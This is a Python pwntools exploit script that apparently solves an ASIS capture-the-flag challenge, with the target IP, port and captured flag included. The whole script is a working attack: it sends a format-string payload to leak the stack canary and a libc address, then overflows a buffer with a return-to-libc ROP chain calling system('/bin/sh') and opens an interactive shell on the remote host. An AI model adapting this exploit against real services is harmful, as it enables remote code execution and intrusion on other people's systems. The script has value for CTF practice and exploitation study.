#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "146.185.132.36"
port = 19153
#ASIS{An_impROv3d_v3r_0f_f41rY_iN_fairy_lAnds!}

r = remote(host,port)
r.recvuntil("battle")
r.sendline("2")
r.sendline("#%23$p#%33$p#")
time.sleep(0.1)
r.recvuntil("#")
time.sleep(0.1)
canary = int(r.recvuntil("#")[:-1],16)
time.sleep(0.1)
print "canary:",hex(canary)
libc = int(r.recvuntil("#")[:-1],16) - 0x20830
print "libc:",hex(libc)
r.recvuntil("battle")
time.sleep(0.1)
r.sendline("1")
pop_rdi = 0x0000000000400ab3
system = libc + 0x45390
sh = libc + 0x18cd17
payload = "a"*0x88 + p64(canary) + p64(0) + p64(pop_rdi) + p64(sh) + p64(system)
r.sendline(payload)
r.interactive()
